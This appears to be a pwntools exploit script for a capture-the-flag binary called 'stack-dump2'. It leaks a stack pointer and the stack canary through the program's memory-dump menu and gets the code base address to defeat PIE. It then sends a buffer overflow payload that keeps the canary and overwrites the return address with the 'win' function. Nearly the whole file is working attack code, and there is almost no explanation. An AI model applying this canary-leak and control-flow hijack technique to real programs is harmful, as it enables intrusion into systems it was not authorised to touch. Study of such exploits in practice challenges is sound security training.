#!/usr/bin/env python2

from pwn import *

def get_ebp(p):
    p.recvuntil("here's a useful stack pointer ", drop=True)
    stack_ptr = int(p.recvline(), 16)
    return stack_ptr + 0x71


def input_data(p, data):
    p.sendline("a")
    p.recvuntil("len: ", drop=True)
    p.sendline(data)


# canary located at [ebp-0x8]
def get_canary(p, ebp):
    canary_addr = ebp - 0x8

    input_data(p, p32(canary_addr))

    #dump canary value
    p.sendline("b")
    p.recvuntil(": ", drop=True)

    # memory dump dumps 20 bytes (fwrite)
    # get first four bytes dumped. Check for canary
    # xor's two DWORD values
    canary_value = p.recvline()[:4]
    return canary_value


def get_text_addr(p):
    p.sendline("c")

    #get first addr in output and drop trailing "-"
    p.recvuntil("quit", drop=True)
    p.recvline()
    output = p.recvuntil("-")[:-1]
    return output


p = process('./stack-dump2')
e = p.elf

ebp = get_ebp(p)
canary = get_canary(p, ebp)
e.address = int(get_text_addr(p), 16)

# +19 for first fgets which has size 0x16
payload = fit({
    0: '200',
    96+19: canary,
    108+19: p32(e.symbols['win']) 
}, filler="A")

input_data(p, payload)

#quit
p.recvuntil("quit", drop=True)
p.sendline("d")

p.interactive()

